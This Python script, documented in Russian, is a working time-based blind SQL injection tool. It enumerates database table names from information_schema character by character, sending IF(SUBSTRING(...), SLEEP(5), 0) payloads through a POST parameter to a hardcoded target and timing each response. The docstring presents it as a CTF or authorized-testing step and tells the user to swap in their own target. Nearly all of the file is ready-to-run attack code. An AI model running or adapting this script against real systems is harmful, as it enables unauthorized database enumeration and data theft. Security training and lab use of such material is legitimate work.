"""
=============================================================================
 perebor_name_table_Time-Based Blind.py — Time-Based Blind SQLi: имена таблиц
=============================================================================

ЗАЧЕМ:
    Посимвольно извлекает имена таблиц из information_schema.tables для заданной
    схемы через слепую инъекцию по времени (IF(...,SLEEP(5),0)). OFFSET
    перебирает таблицы по одной.

ГДЕ ПРИМЕНИМО:
    Слепая Time-Based SQLi, когда нет вывода и нет true/false в ответе, но
    доступен SLEEP(). Шаг «после имени БД»: узнать список таблиц.

ЗАПУСК:
    python3 "perebor_name_table_Time-Based Blind.py"

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - ЗАХАРДКОЖЕНО: url, схема 'sql_order_db', параметр 'name', num_tables=1
      (кол-во таблиц). Замените под свою цель и увеличьте num_tables.
    - SLEEP(5) надёжнее против «шума», но медленнее. Только для авторизованных
      целей / CTF.
=============================================================================
"""
import requests
import time

url = "http://172.23.24.164/index.php"
tables = []
num_tables = 1  # Предполагаемое количество таблиц
charset = "abcdefghijklmnopqrstuvwxyz_0123456789"

for table_num in range(num_tables):
    table_name = ""
    position = 1
    while True:
        found = False
        for char in charset:
            payload = f"123' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sql_order_db' LIMIT 1 OFFSET {table_num}),{position},1)='{char}', SLEEP(5), 0)-- -"
            data = {"name": payload}
            
            start_time = time.time()
            response = requests.post(url, data=data)
            elapsed = time.time() - start_time
            
            if elapsed >= 5:
                table_name += char
                print(f"Таблица {table_num + 1}: {table_name}")
                position += 1
                found = True
                break
        
        if not found:
            break  # Конец названия таблицы
    
    tables.append(table_name)

print(f"Список таблиц: {tables}")
